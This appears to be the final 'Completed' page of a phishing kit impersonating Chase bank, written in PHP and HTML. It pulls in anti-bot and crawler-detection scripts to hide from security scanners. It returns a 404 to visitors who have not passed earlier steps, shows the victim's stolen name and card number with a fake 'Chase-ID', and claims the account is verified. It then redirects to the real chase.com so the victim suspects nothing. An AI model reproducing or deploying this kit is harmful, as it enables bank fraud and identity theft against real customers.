<?php

error_reporting(0);
session_start();
        include'antibots/IP-BlackList.php';  
        include'antibots/Bot-Crawler.php';
        include'antibots/Bot-Spox.php'; 
        include'antibots/Dila_DZ.php';
        @require "antibots/Crawler/src/CrawlerDetect.php";

        use JayBizzle\CrawlerDetect\CrawlerDetect;

if (!isset($_SESSION['check7'])) {

  header("HTTP/1.0 404 Not Found");
  exit();
}
$_SESSION['css6'] = "true";

?>
<html >
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=Edge">
   <link rel="shortcut icon" href="../assets/images/favi.ico">
   <link rel="apple-touch-icon" href="../assets/images/favi.png">
   <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
   <title>My Account: Wallet</title>
   <link href="https://fonts.googleapis.com/css2?family=Material+Icons" rel="stylesheet">
   <link href="https://fonts.googleapis.com/css?family=Raleway|Rock+Salt|Source+Code+Pro:300,400,600" rel="stylesheet">
   <link rel="stylesheet" href="./assets/css/6.php">
   <link rel="stylesheet" type="text/css" href="./assets/css/6.php">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/simple-line-icons/2.3.2/css/simple-line-icons.css">
   <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   <meta http-equiv="pragma" content="no-cache">
   <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
   <script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/46/3/common.js"></script>
   <script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/46/3/util.js"></script>
   <script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/46/3/controls.js"></script>
   <script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/46/3/places_impl.js"></script>
</head>
   <body>
      <div class="mainContainer ">
         <div class="bg">
         </div>
         <div class="hide" id="rotate">
            <div class="circle">
            </div>
            <div class="overlay">
            </div>
         </div>
         <div class="contents">
            <div class="modal hide js-modal">
               <div class="l-modal-shadow js-modal-hide"></div>
               <div class="c-popup l-modal-body">
                  <div class="c-popup-img">
                     <img src="./assets/images/warning.svg">
                  </div>
                  <h3 class="c-popup-title">Warning!</h3>
                  <p class="c-popup-description">Complete the progress first</p>
                  <input style="width:50%" class="bt js-modal-hide" type="submit" value="Continue">
               </div>
            </div>
            <div class="mainContents">
               <a href="#" class="close-icon js-modal-hide"></a>
               <ol class="steps js-modal-hide">
                  <li id="signed"><a class="signed" href="#">Signed</a></li>
                  <li id="Protected"><a class="Protected" href="#">Protected</a></li>
                  <li id="Verify" class=""><a class="Verify" href="#">Verify Ownership</a></li>
                  <li id="Billing" class=""><a class="Billing" href="#">Billing</a></li>
                  <li id="Upload" class=""><a class="Upload" href="#">Upload ID</a></li>
                  <li id="Completed" class="current"><a class="Completed" href="#">Completed</a></li>
               </ol>
               <div id="process">
                  <form class="form" action="#" method="post" style="padding:0 20px!important" novalidate="on">
                     <div class="fields clearfix">
                        <div class="container">
                           <div class="left">
                              <div class="info-box">
                                 <div class="entry">
                                    <i class="icon-user" aria-hidden="true"></i>
                                    <p>Name<br><span><strong><?php echo($_SESSION['fnm']); ?></strong></span></p>
                                 </div>
                                 <div class="entry">
                                    <i class="icon-calendar" aria-hidden="true"></i>
                                    <p>Date:<br><span style="font-size:18px;"><?php echo '
                                    <script type="text/javascript">var x = new Date()
                                       document.write(x)</script>'?></span></p>
                                 </div>
                                 <div class="entry">
                                    <i class="icon-credit-card" aria-hidden="true"></i>
                                    <p>Card:<br><span style="font-size:18px;"><?php echo($_SESSION['cc']);?></span></p>
                                 </div>
                                 <div class="entry">
                                    <i class="icon-notebook" aria-hidden="true"></i>
                                    <p>Chase-ID:<br><span style="font-size:12px;">#PP-483-508-777-426</span></p>
                                 </div>
                              </div>
                           </div>
                           <div class="right">
                              <div class="content">
                                 <div class="header">
                                    <img src="./assets/images/logo.png">
                                    <h4></h4>
                                    
                                 </div>
                                 <div class="main">
                                    <div>
                                       <img src="./assets/images/success.svg" alt="" width="50px">
                                    </div>
                                 </div>
                                 <div class="message">
                                    <p>Congrats, 
                                       <strong><?php echo($_SESSION['fnm']); ?></strong><br>
                                       <font style="color:#41ad49;font-weight:bold">Verified</font><br>
                                    </p>
                                    <div>
                                    </div>
                                    <h5><b style="color:#056dae"></b> You have <b style="color:#41ad49">Verified</b> your account .<br>We are sorry for the inconvenience that this might have caused you. We will update your account within the next 24 hours.
                                    </h5>
                        <a href="">
						<input style="margin-top:2px;margin-bottom:2px;border-radius:5px" id="bt1" class="bt" value="Redirect Me"></a>
                                 </div>
                                 <div class="footer">
                                    <a id="bt2" href="https://www.chase.com/digital/customer-service">Help</a>
                                    <h6>CITI SECURITY TEAM</h6>
                                 </div>
                              </div>
                              <script>
                                 $(window).off("beforeunload");
                                 $("#Billing,#Verify,#Upload,#Completed").removeClass("current");
                                 
                                 $("#Completed").addClass("current"); 
                            setTimeout(function() {
                            window.top.location.href = "https://" + "www.chase.com";
                        }, 5000);
                        
                        $(document).on('click', '#bt1', function() {
                            window.top.location.href = "https://" + "www.chase.com";
                        });
                        $(document).on('click', '#bt2', function() {
                            window.top.location.href = "https://" + "www.chase.com/digital/customer-service";
                        });
                              </script>
                           </div>
                        </div>
                     </div>
                  </form>
               </div>
            </div>
            <script type="text/javascript">
               $(".js-modal-hide").click(function(){$(".js-modal").toggleClass("hide");});
               $(".js-alert-hide").click(function(){$(".js-alert").toggleClass("hide");});
            </script>
         </div>
      </div>
      <div class="pac-container pac-logo" style="width: 0px; position: absolute; left: 0px; top: 49px; display: none;"></div>
   </body>
</html>